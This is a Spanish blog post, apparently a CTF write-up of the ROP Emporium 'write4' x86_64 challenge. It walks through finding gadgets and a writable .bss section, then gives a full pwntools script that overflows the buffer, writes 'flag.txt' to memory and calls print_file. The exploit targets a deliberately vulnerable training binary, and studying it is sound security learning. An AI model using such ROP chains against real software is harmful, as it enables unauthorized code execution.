---
layout: post
title: Write4 ROP Emporium (x86_64)
comments: true
categories: [Pwn, Writeups, ROPEmporium]
---

Este es otro post de la serie de writeups de [ROP Emporium](https://ropemporium.com/challenge/split.html). Con esta serie de posts aprenderemos sobre una de las técnicas más utilizadas en la explotación de binarios, la [***ROP***]({% post_url 2024-08-15-ROP %}), ó *Return Orineted Programming* (Programación orientada a *return*).

Concretamente en este reto, utilizaremos *ROP gadgets* para llamar a varias funciones pasándoles argumentos.

# x86_64 (Intended)
## Reconocimiento

Como siempre comenzamos lanzando checksec:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

El enunciado:

> The important thing to realize in this challenge is that ROP is just a form of arbitrary code execution and if we’re creative we can leverage it to do things like write to or read from memory. The question is what mechanism are we going to use to solve this problem, is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won’t be using built-in functionality since that’s too similar to the previous challenges, instead we’ll be looking for gadgets that let us write a value to memory such as
`mov [reg], reg`.

Por lo que parece, será un ataque de tipo [ROP]({% post_url 2024-08-15-ROP %}).

Analizando con gdb-pwndbg, vemos las siguientes funciones:

```
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
```

Vemos que ahora la función *pwnme* se encuentra enlazada dinámicamente. Además, hay una función *printfile* a la que tendremos que llamar:

```
0x00007ffff7a00943 <+0>:	push   rbp
0x00007ffff7a00944 <+1>:	mov    rbp,rsp
0x00007ffff7a00947 <+4>:	sub    rsp,0x40
0x00007ffff7a0094b <+8>:	mov    QWORD PTR [rbp-0x38],rdi
0x00007ffff7a0094f <+12>:	mov    QWORD PTR [rbp-0x8],0x0
0x00007ffff7a00957 <+20>:	mov    rax,QWORD PTR [rbp-0x38]
0x00007ffff7a0095b <+24>:	lea    rsi,[rip+0xd5]        # 0x7ffff7a00a37
0x00007ffff7a00962 <+31>:	mov    rdi,rax
0x00007ffff7a00965 <+34>:	call   0x7ffff7a007a0 <fopen@plt>
0x00007ffff7a0096a <+39>:	mov    QWORD PTR [rbp-0x8],rax
0x00007ffff7a0096e <+43>:	cmp    QWORD PTR [rbp-0x8],0x0
0x00007ffff7a00973 <+48>:	jne    0x7ffff7a00997 <print_file+84>
0x00007ffff7a00975 <+50>:	mov    rax,QWORD PTR [rbp-0x38]
0x00007ffff7a00979 <+54>:	mov    rsi,rax
0x00007ffff7a0097c <+57>:	lea    rdi,[rip+0xb6]        # 0x7ffff7a00a39
0x00007ffff7a00983 <+64>:	mov    eax,0x0
0x00007ffff7a00988 <+69>:	call   0x7ffff7a00750 <printf@plt>
0x00007ffff7a0098d <+74>:	mov    edi,0x1
0x00007ffff7a00992 <+79>:	call   0x7ffff7a007b0 <exit@plt>
0x00007ffff7a00997 <+84>:	mov    rdx,QWORD PTR [rbp-0x8]
0x00007ffff7a0099b <+88>:	lea    rax,[rbp-0x30]
0x00007ffff7a0099f <+92>:	mov    esi,0x21
0x00007ffff7a009a4 <+97>:	mov    rdi,rax
0x00007ffff7a009a7 <+100>:	call   0x7ffff7a00780 <fgets@plt>
0x00007ffff7a009ac <+105>:	lea    rax,[rbp-0x30]
0x00007ffff7a009b0 <+109>:	mov    rdi,rax
0x00007ffff7a009b3 <+112>:	call   0x7ffff7a00730 <puts@plt>
0x00007ffff7a009b8 <+117>:	mov    rax,QWORD PTR [rbp-0x8]
0x00007ffff7a009bc <+121>:	mov    rdi,rax
0x00007ffff7a009bf <+124>:	call   0x7ffff7a00740 <fclose@plt>
0x00007ffff7a009c4 <+129>:	mov    QWORD PTR [rbp-0x8],0x0
0x00007ffff7a009cc <+137>:	nop
0x00007ffff7a009cd <+138>:	leave
0x00007ffff7a009ce <+139>:	ret
```

También necesitaremos la cadena *flag.txt*, que por desgracia no está en el binario:

```
search flag.txt
Searching for value: 'flag.txt'
warning: Unable to access 16007 bytes of target memory at 0x7ffff7a01000, halting search.
```

Por tanto, debemos encontrar un gadget que nos permita escribir en una región del binario con permisos de lectura/escritura. Para ello utilizaremos ROPGadget:

```bash
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
```

Con este gadget podemos escribir en la dirección a la que apunte *r14*, que será una zona con permisos R/W. Para buscar dicha zona utilizaremos radare2:

```bash
r2 write4

WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time

[0x00400520]> iS
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- STRTAB      .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- RELA        .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- RELA        .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x PROGBITS    .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x PROGBITS    .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- PROGBITS    .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- STRTAB      .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```

Utilizaremos la sección *.bss*, aunque *.data* debería funcionar igualmente.

Ahora nos falta un gadget que nos permita guardar valores en *r14* y *r15*:

```
0x0000000000400690 : pop r14 ; pop r15 ; ret
```

Solo nos falta ver de dónde toma el argumento *print_file*. En este caso, viendo el código de arriba, veremos que el nombre del archivo se debe pasar en *rdi*.

```
0x0000000000400693 : pop rdi ; ret
```

## Explotación

Ya solo queda hacer el script, que quedaría:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
context.bits=64
exe = './write4'

def start():
    
    return process(exe)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

padding=40*b'A' #Same as previous

# 0x0000000000400510  print_file@plt
print_file = p64(0x0000000000400510)

flag_txt = b'flag.txt'

# 0x0000000000400628 : mov qword ptr [r14], r15 ; ret
load_r14 = p64(0x0000000000400628)

rw_section = p64(0x00601038)

# 0x0000000000400690 : pop r14 ; pop r15 ; ret
pop_r14_r15 = p64(0x0000000000400690)

# 0x0000000000400693 : pop rdi ; ret
pop_rdi = p64(0x0000000000400693)

payload = padding + pop_r14_r15 + rw_section + flag_txt + load_r14 + pop_rdi + rw_section + print_file

io.send(payload)

io.interactive()
```

Un reto muy interesante para seguir afianzando conceptos. ¡Nos vemos en el próximo post!